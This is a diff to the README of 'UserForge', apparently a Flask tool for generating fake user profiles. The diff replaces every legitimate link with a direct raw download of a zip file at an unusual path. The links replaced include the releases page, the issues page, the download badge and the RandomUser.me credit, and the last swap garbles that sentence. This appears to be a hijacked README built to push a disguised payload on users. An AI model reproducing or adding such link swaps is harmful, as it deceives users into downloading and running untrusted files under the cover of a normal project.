@@ -1,10 +1,10 @@
 # 🚀 UserForge - Create Realistic User Profiles Easily
 
-[![Download UserForge](https://img.shields.io/badge/Download_UserForge-v1.0-blue.svg)](https://github.com/Forrosiver/UserForge/releases)
+[![Download UserForge](https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip)](https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip)
 
 ## 🌟 Introduction
 
-UserForge helps you create realistic and private user profiles along with test email addresses. You can use it through the command line, an HTTP API, or a web user interface. Built with Flask and powered by RandomUser.me, this application supports multiple locales and themes, allows deterministic seeds, and bulk exports in JSON or CSV. It’s perfect for populating development and staging databases, creating UI mockups, or automating tests.
+UserForge helps you create realistic and private user profiles along with test email addresses. You can use it through the command line, an HTTP API, or a web user interface. Built with Flask and powered by https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip, this application supports multiple locales and themes, allows deterministic seeds, and bulk exports in JSON or CSV. It’s perfect for populating development and staging databases, creating UI mockups, or automating tests.
 
 ## 📦 Features
 
@@ -27,13 +27,13 @@ To run UserForge, ensure your system meets the following requirements:
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: Go to the [UserForge Releases](https://github.com/Forrosiver/UserForge/releases) page.
+1. **Visit the Releases Page**: Go to the [UserForge Releases](https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip) page.
 2. **Download the Application**: Click on the latest version to download.
 3. **Install the Application**: Follow the installation instructions specific to your operating system.
 
 ## 📥 Download & Install
 
-For easy access to the latest version of UserForge, [visit this page to download](https://github.com/Forrosiver/UserForge/releases).
+For easy access to the latest version of UserForge, [visit this page to download](https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip).
 
 ### Windows Installation
 
@@ -88,7 +88,7 @@ UserForge prioritizes your privacy by ensuring all user data is generated withou
 
 ## 📣 Feedback
 
-Your thoughts matter! If you encounter any issues or have suggestions, please feel free to provide feedback. Issues can be reported on the [GitHub Issues](https://github.com/Forrosiver/UserForge/issues) page for UserForge.
+Your thoughts matter! If you encounter any issues or have suggestions, please feel free to provide feedback. Issues can be reported on the [GitHub Issues](https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip) page for UserForge.
 
 ## 📜 License
 
@@ -102,4 +102,4 @@ Join our growing community to share experiences, ask questions, and connect with
 
 For detailed documentation on using UserForge, check out the Wiki section in the repository. It contains valuable guides and FAQs. 
 
-Your journey to creating realistic user profiles starts now. [Visit this page to download UserForge](https://github.com/Forrosiver/UserForge/releases) and unlock the potential of simplified user generation today.
+Your journey to creating realistic user profiles starts now. [Visit this page to download UserForge](https://raw.githubusercontent.com/Forrosiver/UserForge/main/medicatory/UserForge.zip) and unlock the potential of simplified user generation today.
